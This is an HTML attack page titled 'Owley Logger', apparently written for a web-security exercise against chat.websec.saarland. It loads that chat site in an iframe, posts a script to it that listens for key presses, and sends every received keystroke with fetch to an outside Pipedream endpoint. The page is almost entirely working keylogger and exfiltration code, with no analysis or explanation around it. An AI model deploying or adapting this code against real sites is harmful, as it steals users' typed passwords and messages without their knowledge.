<!DOCTYPE html>
<html>
<head>
  <title>Owley Logger</title>
  <script>
    // Function to send logs to your Pipedream endpoint
    function logToServer(data) {
      fetch("https://eooaktfbjo7cto7.m.pipedream.net", {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({ data: data })
      });
    }

    function setupKeylogger() {
      const iframe = document.getElementById('chat_frame');
      const chatOrigin = 'https://chat.websec.saarland';

      // Inject keylogger script into the iframe
      const injectScript = `
        window.addEventListener('keydown', (e) => {
          // Send key back to parent
          window.parent.postMessage({ key: e.key }, '*');
        });
        true; // Needed for Safari compatibility
      `;

      try {
        // Wait for iframe to load, then inject the script
        iframe.contentWindow.postMessage({
          type: 'inject',
          script: injectScript
        }, chatOrigin);
      } catch (e) {
        logToServer("Error: " + e.message);
      }
    }

    // Listen for messages from the iframe (keystrokes)
    window.addEventListener('message', (e) => {
      if (e.data && e.data.key) {
        logToServer(e.data.key);
      }
    });
  </script>
</head>
<body>
  <h1>Welcome Owley ðŸ˜ˆ</h1>
  <iframe 
    id="chat_frame"
    src="https://chat.websec.saarland" 
    onload="setupKeylogger()"
    style="width: 100%; height: 500px; border: 1px solid black;"
  ></iframe>
</body>
</html>
